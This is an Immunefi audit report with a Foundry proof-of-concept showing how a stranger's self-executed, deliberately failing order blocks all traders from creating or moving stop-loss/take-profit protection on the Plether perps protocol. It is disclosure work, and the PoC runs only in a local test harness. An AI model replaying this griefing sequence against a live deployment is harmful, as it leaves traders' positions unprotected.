# \#99531 [SC-Low] A stranger's failed order blocks every trader from placing or changing stop-loss / take-profit protection

**Submitted on Nov 14th 2026 at 03:45:58 UTC by @tinnohofficial for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99531
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
Every order execution moves the Engine mark to the order's historical Pyth tick but leaves the Oracle's accepted live basket where it was. While the Engine mark is newer than that basket, `createPositionProtection`, `replacePositionProtection` and `commitOpenOrderWithProtection` revert with `PletherOracle__PriceOutOfOrder` for every account. This contradicts the Book's own synchronization rule, which accepts exactly this state (`acceptedTime < markTime`), and the interface, which lists only Router pause and frozen oracle as reasons placement is unavailable. A stranger can hold the market in this state at no USDG cost: in the PoC it commits an open whose price limit cannot be met and executes it itself, the order ends `Failed`, its bounty returns to the same account, the Engine mark has still advanced, and the victim cannot move its stop-loss in 5 of 5 cycles, each run right after an honest mark refresh, and cannot create a new one after cancelling.

## Vulnerability Details
Single-order execution installs the Engine mark in the outer frame, before the order item runs (`OrderRouterExecutionSidecar.sol` L961-L980, L1053-L1062):

```solidity
(bool ok, IPletherOracle.PriceSnapshot memory snapshot) =
    oracle.updateOrderExecutionPrice{value: result.fee}(executor, pythUpdateData, _oracleRequest(order, false));
...
_updateEngineMark(host, result); // <-@ Engine mark := historical tick, also when the order then fails
```

The historical route never writes the Oracle's accepted live basket; only the live routes do (`PletherOracle.sol` L596-L643 versus L749-L799). So after any execution, `acceptedLiveBasket.publishTime < engine.lastMarkTime()`.

All three placement paths start with `_freshProtectionObservation` (`PositionProtectionBook.sol` L229, L295, L463, L862-L886):

```solidity
IPletherOracle.PriceSnapshot memory current = oracle.getLatestPrice(IPletherOracle.PriceMode.MarkRefresh); // <-@ reverts
currentMarkPrice = current.markPrice;
currentPublishTime = current.publishTime;
if (!_acceptedMarkInstalled()) {
    revert PositionProtectionBook__OracleMarkAhead();
}
```

`getLatestPrice` reads the accepted live basket and enforces ordering against the Engine (`PletherOracle.sol` L890-L896):

```solidity
uint64 markTime = engine.lastMarkTime();
if (snapshot.publishTime < markTime) {
    revert PletherOracle__PriceOutOfOrder(snapshot.publishTime, markTime); // <-@
}
```

The Book's own rule, two lines later, says the opposite (`PositionProtectionBook.sol` L888-L895):

```solidity
function _acceptedMarkInstalled() private view returns (bool) {
    (bool accepted, uint256 acceptedPrice, uint64 acceptedTime) = _activeOracle().getAcceptedBasketMark();
    if (!accepted) {
        return true;
    }
    uint64 markTime = ENGINE.lastMarkTime();
    return acceptedTime < markTime || (acceptedTime == markTime && acceptedPrice == ENGINE.lastMarkPrice()); // <-@
}
```

`acceptedTime < markTime` is written as an acceptable state, and the same function lets a protection attached to an open arm in that state after the parent fill (L596-L604). For create, replace and attached-open staging the branch cannot be reached, because the Oracle read above it reverts first.

**The attack needs no fill.** A stranger commits an open with a limit that can never be met (a SHORT with `targetPrice = 1`) and executes it itself with the first post-commit tick. The mark is installed, then the item fails on slippage: status `Failed`, the reserved bounty is paid to the executor, which is the same account, and nothing stays queued. The stranger repeats this after each mark refresh by anyone. No protection can be placed or changed between its execution and the next refresh, and an ordinary fill by any trader has the same effect without any attacker.

**Why this is not intended behaviour**
1. The Book's synchronization predicate accepts `acceptedTime < markTime` (L894). The revert comes from an earlier call that the predicate was written to follow, so the rule in the code and the behaviour disagree.
2. The interface lists when placement is unavailable: "Router pause blocks creation and replacement" and frozen oracle (`IPositionProtectionActions.sol` L10-L14; `CANONICAL_ENTRYPOINTS.md` L127). An unrelated order execution is not on that list.
3. The audit reply that introduced the Oracle read says the guard "rejects arming when the accepted oracle mark is ahead of, or inconsistent with, the Engine mark". Here the Engine holds the newer authenticated mark and the accepted basket is merely older, the case the predicate allows.
4. An empty-payload `updateMarkPrice` (replay of the accepted basket) cannot repair it; it reverts with the same error. A new signed live basket is required, so a trader cannot fix it with the protection call alone.
5. The repository's tests do not exercise this state. Its protection tests open the position with a harness helper that calls the Engine directly as the Router (`BasePerpTest._open`, used for example at `test/perps/spec/trader/PositionProtection.t.sol` L276), so no order execution moves the Engine mark before the protection is placed. The only synchronization case they assert is the opposite one, an accepted basket ahead of the Engine (`PositionProtectionBook__OracleMarkAhead`, L275-L291).

## Impact Details
Griefing: a stranger with no position and no USDG cost prevents all traders from arming a stop-loss or take-profit, from moving an existing one, and from opening with attached protection.

| Same victim, same position, same price | After an honest refresh (control) | After the stranger's failed order |
|---|---|---|
| accepted live basket time vs Engine mark time | equal | accepted is 1 s behind |
| `createPositionProtection` | arms | reverts `PriceOutOfOrder` |
| `replacePositionProtection` | succeeds | reverts `PriceOutOfOrder` |
| `commitOpenOrderWithProtection` | stages | reverts `PriceOutOfOrder` |
| `updateMarkPrice` with an empty payload (replay of the accepted basket) | not needed | reverts `PriceOutOfOrder` |
| stranger's order | - | `Failed`, nothing queued |
| stranger's USDG change over 5 cycles | - | 0 atoms (10,000.20 USDG in the clearinghouse before and after; wallet unchanged; no position) |
| victim `replacePositionProtection` calls blocked | 0 | 5 of 5 |
| other trader's protected opens blocked | 0 | 5 of 5 |
| victim create after cancelling | arms | reverts `PriceOutOfOrder` |

- A trader who cancels a stop to move it, or who has just opened, stays unprotected while the state lasts. The PoC shows a victim that cancels its stop in order to place a new one and then cannot create it.
- The state returns after every refresh for the price of one commit and one execution by the stranger, and after every ordinary fill with no attacker at all.

**Recommendation.** Let the placement paths use the Engine's newer authenticated mark when `acceptedTime < markTime`, as `_acceptedMarkInstalled` already intends, and take the arming baseline from that timestamp. Alternatively accept a signed payload in the placement call and synchronize the accepted basket in the same transaction. Keep rejecting when the accepted basket is ahead of the Engine or differs at equal time.

## References
https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L862-L895

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L207-L235

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L596-L604

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L878-L901

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L596-L643

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L961-L980

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1053-L1062

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L10-L14

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/trader/PositionProtection.t.sol#L275-L291

## Proof of Concept

# Proof of concept

Foundry test for the repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. It uses only public entry points of the unmodified contracts (`OrderRouter.commitOrder`, `executeOrder`, `updateMarkPrice`, and the `PositionProtectionBook` actions) with the repository's own test harness and its Pyth mock. Risk parameters are the release values: maintenance 0.1%, initial 0.2%, frozen-market margin 3%, execution fee 0.04%, VPI factor 1%, basket confidence cap 10 bp, adverse-confidence multiplier 25%, Senior limit 40M USDG / 80%.

## Run
Save the file below as `packages/perps/test/poc/ProtectionPlacementAfterFill.t.sol`, then from the repository root:

```
forge test --root packages/perps --match-path test/poc/ProtectionPlacementAfterFill.t.sol -vv
```

## Output
```
Ran 4 tests for test/poc/ProtectionPlacementAfterFill.t.sol:ProtectionPlacementAfterFillTest
[PASS] test_Control_ProtectionActionsSucceedAfterLiveRefresh() (gas: 2535275)
Logs:
  CONTROL
    accepted live basket time : 1709535603
    accepted live basket price: 100000000
    engine lastMarkTime        : 1709535603
    engine lastMarkPrice       : 100000000
  CONTROL: create, replace and attached-open all succeed
[PASS] test_Control_ReplayOfFillPayloadRestoresProtection() (gas: 3138486)
Logs:
  fill-payload replay restored protection without a newer Pyth tick
[PASS] test_FailedOrderBlocksProtectionPlacementAtZeroCost() (gas: 13516302)
Logs:
  cycles run: 5
  victim replace calls blocked: 5
  protected opens blocked: 5
  stranger clearinghouse balance before (atoms): 10000200000
  stranger clearinghouse balance after  (atoms): 10000200000
  stranger position size after: 0
[PASS] test_ThirdPartyFillBlocksProtectionActions() (gas: 6676298)
Logs:
  ATTACK after one griefer fill
    accepted live basket time : 1709535603
    accepted live basket price: 100000000
    engine lastMarkTime        : 1709535604
    engine lastMarkPrice       : 100000000
  Griefer settlement spent for 2 fills (USDG atoms, incl. open costs kept in its own position):
  1404020
  Griefer position size after 2 fills: 4000000000000000000000
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished
```

## What each test shows
- `test_Control_ProtectionActionsSucceedAfterLiveRefresh`: with the accepted live basket and the Engine mark at the same time, create, replace and open-with-protection all succeed.
- `test_FailedOrderBlocksProtectionPlacementAtZeroCost`: five cycles. Each cycle starts with an honest live refresh. The stranger then commits a SHORT open with a limit of 1 and executes it itself: the order ends `Failed`, nothing stays queued, and the Engine mark is one second ahead of the accepted basket. The victim's `replacePositionProtection`, another trader's `commitOpenOrderWithProtection` and an empty-payload `updateMarkPrice` all revert `PletherOracle__PriceOutOfOrder`. After the last cycle the victim cancels its protection and cannot create a new one. The stranger's clearinghouse balance (10,000.20 USDG) and wallet balance are unchanged and it holds no position.
- `test_ThirdPartyFillBlocksProtectionActions`: the same state after one ordinary fill by any trader; a new live refresh restores placement and the next fill breaks it again.
- `test_Control_ReplayOfFillPayloadRestoresProtection`: submitting a signed payload through `updateMarkPrice` restores placement, so the block lasts until someone sends a new signed live basket.

## Test file
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title ProtectionPlacementAfterFill
/// @notice Any third-party historical order fill advances the Engine mark past the oracle's accepted live basket.
///         `PositionProtectionBook._freshProtectionObservation` then calls `oracle.getLatestPrice(MarkRefresh)`, whose
///         `_snapshotFromBasket(..., enforcePublishOrder=true)` reverts `PriceOutOfOrder`, even though the Book's own
///         `_acceptedMarkInstalled()` guard explicitly accepts `acceptedTime < engineMarkTime`. Result: protection
///         creation, replacement and attached-open staging revert for every account until someone installs a NEW live
///         Pyth tick (an empty-payload replay cannot cure it).
contract ProtectionPlacementAfterFillTest is BasePerpTest {

    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    address internal constant ALICE = address(0xA11CE); // victim with an open position
    address internal constant CAROL = address(0xCA201); // victim opening with attached protection
    address internal constant GRIEFER = address(0x6E1F); // any trader/keeper

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant SIZE = 100_000e18; // 1,000 lots = 100,000 USDG notional
    uint256 internal constant MARGIN = 5_000e6;
    uint256 internal constant LONG_TP = 90_000_000;
    uint256 internal constant LONG_SL = 110_000_000;
    uint256 internal constant GRIEF_SIZE = 100e18 * 20; // 20 lots = 2,000 USDG notional (release minimum ~1,000)
    uint256 internal constant GRIEF_MARGIN = 100e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // Release parameters (DEPLOYMENT.md): vpiFactor 0.01e18, maint 10, init 20, fad 300, carry 500 bps,
        // min bounty 1 USDG, bounty 10 bps, keeper share 50%, protocol share 0.
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 20_000_000e6;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        // The harness advances through both 72-hour governance timelocks.
        // Return to its pinned Monday fixture before beginning user actions.
        vm.warp(SETUP_TIMESTAMP);
        protectionActions = IPositionProtectionActions(address(router.positionProtectionBook()));
        protectionViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        _fundTrader(ALICE, 100_000e6);
        _fundTrader(CAROL, 100_000e6);
        _fundTrader(GRIEFER, 10_000e6);
        _refreshMark(MARK_PRICE);
        // Alice's setup position is created through the public V3 Router and
        // the accepted live mark is refreshed afterward for a clean control.
        OrderV3Types.OrderRequest memory request =
            _boundedOpenRequest(CfdTypes.Side.LONG, SIZE, MARGIN, 0, bytes32(uint256(0xA11CE)));
        vm.prank(ALICE);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory fillData = _mockPythUpdateData(MARK_PRICE);
        vm.prank(GRIEFER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, fillData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "setup V3 open executes");
        _refreshMark(MARK_PRICE);
    }

    // ------------------------------------------------------------------------------------------------------------
    // CONTROL: latest Engine mark came from a live refresh -> owner actions succeed.
    // ------------------------------------------------------------------------------------------------------------
    function test_Control_ProtectionActionsSucceedAfterLiveRefresh() public {
        _logMarks("CONTROL");
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(_params(LONG_TP, LONG_SL));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "control: create arms"
        );

        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(ALICE);
        protectionActions.replacePositionProtection(protectionId, _params(LONG_TP + 1_000_000, LONG_SL - 1_000_000));

        OrderV3Types.OrderRequest memory request =
            _boundedOpenRequest(CfdTypes.Side.LONG, SIZE, MARGIN, 0, bytes32(uint256(0xC0A1)));
        vm.prank(CAROL);
        (, uint64 carolProtection) = protectionActions.commitOpenOrderWithProtection(request, _params(LONG_TP, LONG_SL));
        assertEq(
            uint8(protectionViews.getPositionProtection(carolProtection).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.PendingOpen),
            "control: attached open stages"
        );
        console2.log("CONTROL: create, replace and attached-open all succeed");
    }

    // ------------------------------------------------------------------------------------------------------------
    // ATTACK: one unrelated third-party fill blocks create / replace / attached open for everybody.
    // ------------------------------------------------------------------------------------------------------------
    function test_ThirdPartyFillBlocksProtectionActions() public {
        // Alice arms a protection while the mark is live (needed later for the replace check).
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(_params(LONG_TP, LONG_SL));

        // Alice cancels to change the stop while the accepted mark is still current.
        // The unrelated fill is inserted before her next create transaction.
        vm.prank(ALICE);
        protectionActions.cancelPositionProtection(protectionId);

        uint256 grieferBefore = clearinghouse.balanceAssets(GRIEFER);
        _grieferFill(CfdTypes.Side.SHORT);
        _logMarks("ATTACK after one griefer fill");

        (bool accepted,, uint64 acceptedTime) = pletherOracle.getAcceptedBasketMark();
        uint64 markTime = engine.lastMarkTime();
        assertTrue(accepted, "accepted basket exists");
        assertLt(acceptedTime, markTime, "engine mark is ahead of accepted live basket");
        // The Book's own guard (_acceptedMarkInstalled) treats this as installed: acceptedTime < markTime.

        bytes memory outOfOrder =
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime);

        // 1) New protection on an existing position.
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(ALICE);
        vm.expectRevert(outOfOrder);
        protectionActions.createPositionProtection(_params(LONG_TP, LONG_SL));
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "Alice is now unprotected");

        // 2) Attached open (flat account).
        OrderV3Types.OrderRequest memory request =
            _boundedOpenRequest(CfdTypes.Side.LONG, SIZE, MARGIN, 0, bytes32(uint256(0xC0A1)));
        vm.prank(CAROL);
        vm.expectRevert(outOfOrder);
        protectionActions.commitOpenOrderWithProtection(request, _params(LONG_TP, LONG_SL));

        // 3) An empty-payload refresh (replay of the accepted basket) cannot cure it.
        vm.expectRevert(outOfOrder);
        router.updateMarkPrice(new bytes[](0));

        // 4) Only a NEW live tick (>= the fill tick) cures it ...
        _refreshMark(MARK_PRICE);
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(_params(LONG_TP, LONG_SL));

        // 5) ... and the next unrelated fill breaks replacement again.
        _grieferFill(CfdTypes.Side.SHORT);
        (, , acceptedTime) = pletherOracle.getAcceptedBasketMark();
        markTime = engine.lastMarkTime();
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(ALICE);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime)
        );
        protectionActions.replacePositionProtection(protectionId, _params(LONG_TP + 1_000_000, LONG_SL - 1_000_000));

        int256 grieferCost = int256(grieferBefore) - int256(clearinghouse.balanceAssets(GRIEFER));
        console2.log("Griefer settlement spent for 2 fills (USDG atoms, incl. open costs kept in its own position):");
        console2.logInt(grieferCost);
        (uint256 gSize,,,,,,) = engine.positions(GRIEFER);
        console2.log("Griefer position size after 2 fills:", gSize);
    }

    // ------------------------------------------------------------------------------------------------------------
    // ATTACK (zero cost): the stranger's order never fills. It commits an open whose price limit cannot be met and
    // executes it itself. The order ends Failed(Slippage), the bounty comes back to the same account, and the Engine
    // mark has still moved past the accepted live basket. Repeated after every honest refresh.
    // ------------------------------------------------------------------------------------------------------------
    function test_FailedOrderBlocksProtectionPlacementAtZeroCost() public {
        uint256 cycles = 5;
        uint256 strangerBefore = clearinghouse.balanceAssets(GRIEFER);
        uint256 strangerWalletBefore = settlementToken.balanceOf(GRIEFER);
        uint256 blockedReplaces;
        uint256 blockedProtectedOpens;
        uint64 protectionId;

        for (uint256 i; i < cycles; ++i) {
            // An honest keeper refreshes the live mark: accepted basket == Engine mark.
            _refreshMark(MARK_PRICE);
            (,, uint64 acceptedTime) = pletherOracle.getAcceptedBasketMark();
            assertEq(acceptedTime, engine.lastMarkTime(), "refresh synchronizes the two marks");
            if (i == 0) {
                // CONTROL inside the same test: with synchronized marks the victim arms its stop.
                vm.prank(ALICE);
                protectionId = protectionActions.createPositionProtection(_params(LONG_TP, LONG_SL));
            }

            // The stranger's unfillable order: SHORT open with a limit of 1 (never met), self-executed.
            OrderV3Types.OrderRequest memory request = _boundedOpenRequest(
                CfdTypes.Side.SHORT, GRIEF_SIZE, GRIEF_MARGIN, 1, bytes32(uint256(router.nextCommitId()))
            );
            vm.prank(GRIEFER);
            uint64 orderId = router.commitOrder(request);
            bytes[] memory data = _mockPythUpdateData(MARK_PRICE);
            vm.prank(GRIEFER);
            OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "stranger's order fails");
            assertEq(router.pendingOrderCounts(GRIEFER), 0, "nothing stays queued");

            (,, acceptedTime) = pletherOracle.getAcceptedBasketMark();
            uint64 markTime = engine.lastMarkTime();
            assertLt(acceptedTime, markTime, "failed order still moved the Engine mark ahead");
            bytes memory outOfOrder =
                abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedTime, markTime);

            // 1) The victim cannot move its stop.
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(ALICE);
            vm.expectRevert(outOfOrder);
            protectionActions.replacePositionProtection(protectionId, _params(LONG_TP + 1_000_000, LONG_SL - 1_000_000));
            ++blockedReplaces;

            // 2) A flat trader cannot open with attached protection.
            OrderV3Types.OrderRequest memory protectedOpen = _boundedOpenRequest(
                CfdTypes.Side.LONG, SIZE, MARGIN, 0, bytes32(uint256(0xC0A100 + i))
            );
            vm.prank(CAROL);
            vm.expectRevert(outOfOrder);
            protectionActions.commitOpenOrderWithProtection(protectedOpen, _params(LONG_TP, LONG_SL));
            ++blockedProtectedOpens;

            // 3) Replaying the accepted basket (empty payload) cannot repair it.
            vm.expectRevert(outOfOrder);
            router.updateMarkPrice(new bytes[](0));
        }

        // 4) A victim that cancels in order to re-create is left with no protection at all.
        vm.prank(ALICE);
        protectionActions.cancelPositionProtection(protectionId);
        (,, uint64 acceptedNow) = pletherOracle.getAcceptedBasketMark();
        uint64 markNow = engine.lastMarkTime();
        vm.prank(ALICE);
        vm.expectRevert(
            abi.encodeWithSelector(IPletherOracle.PletherOracle__PriceOutOfOrder.selector, acceptedNow, markNow)
        );
        protectionActions.createPositionProtection(_params(LONG_TP, LONG_SL));
        assertEq(protectionViews.activePositionProtectionId(ALICE), 0, "victim has no protection");

        (uint256 strangerSize,,,,,,) = engine.positions(GRIEFER);
        console2.log("cycles run:", cycles);
        console2.log("victim replace calls blocked:", blockedReplaces);
        console2.log("protected opens blocked:", blockedProtectedOpens);
        console2.log("stranger clearinghouse balance before (atoms):", strangerBefore);
        console2.log("stranger clearinghouse balance after  (atoms):", clearinghouse.balanceAssets(GRIEFER));
        console2.log("stranger position size after:", strangerSize);
        assertEq(clearinghouse.balanceAssets(GRIEFER), strangerBefore, "stranger pays no USDG");
        assertEq(settlementToken.balanceOf(GRIEFER), strangerWalletBefore, "stranger wallet unchanged");
        assertEq(strangerSize, 0, "stranger holds no position");
    }

    function test_Control_ReplayOfFillPayloadRestoresProtection() public {
        bytes[] memory fillPayload = _grieferFill(CfdTypes.Side.SHORT);
        (, , uint64 acceptedBefore) = pletherOracle.getAcceptedBasketMark();
        uint64 engineTime = engine.lastMarkTime();
        assertLt(acceptedBefore, engineTime, "fill advanced engine only");

        // The payload used for the historical fill is public on chain. Check whether
        // a caller can install it as the accepted live basket without a new tick.
        router.updateMarkPrice(fillPayload);
        (, , uint64 acceptedAfter) = pletherOracle.getAcceptedBasketMark();
        assertEq(acceptedAfter, engineTime, "replay caught accepted basket up");
        vm.prank(ALICE);
        uint64 protectionId = protectionActions.createPositionProtection(_params(LONG_TP, LONG_SL));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Armed),
            "owner can arm after public payload replay"
        );
        console2.log("fill-payload replay restored protection without a newer Pyth tick");
    }

    // ------------------------------------------------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------------------------------------------------

    /// @dev Griefer commits a minimum-size open at the current timestamp, then (one second / one block later) executes
    ///      it as the keeper with the unique historical tick after commit. Any trader's fill has the same effect.
    function _grieferFill(
        CfdTypes.Side side
    ) internal returns (bytes[] memory data) {
        OrderV3Types.OrderRequest memory request = _boundedOpenRequest(
            side, GRIEF_SIZE, GRIEF_MARGIN, 0, bytes32(uint256(router.nextCommitId()))
        );
        vm.prank(GRIEFER);
        uint64 orderId = router.commitOrder(request);
        data = _mockPythUpdateData(MARK_PRICE);
        vm.prank(GRIEFER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "griefer fill executes");
    }

    function _logMarks(
        string memory label
    ) internal view {
        (, uint256 acceptedPrice, uint64 acceptedTime) = pletherOracle.getAcceptedBasketMark();
        console2.log(label);
        console2.log("  accepted live basket time :", acceptedTime);
        console2.log("  accepted live basket price:", acceptedPrice);
        console2.log("  engine lastMarkTime        :", engine.lastMarkTime());
        console2.log("  engine lastMarkPrice       :", engine.lastMarkPrice());
    }

    function _params(
        uint256 takeProfit,
        uint256 stopLoss
    ) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _boundedOpenRequest(
        CfdTypes.Side side,
        uint256 sizeDelta,
        uint256 marginDelta,
        uint256 targetPrice,
        bytes32 clientOrderId
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = side;
        request.sizeDelta = sizeDelta;
        request.marginDelta = marginDelta;
        request.targetPrice = targetPrice == 0 ? (side == CfdTypes.Side.LONG ? 1 : engine.CAP_PRICE()) : targetPrice;
        request.isClose = false;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```
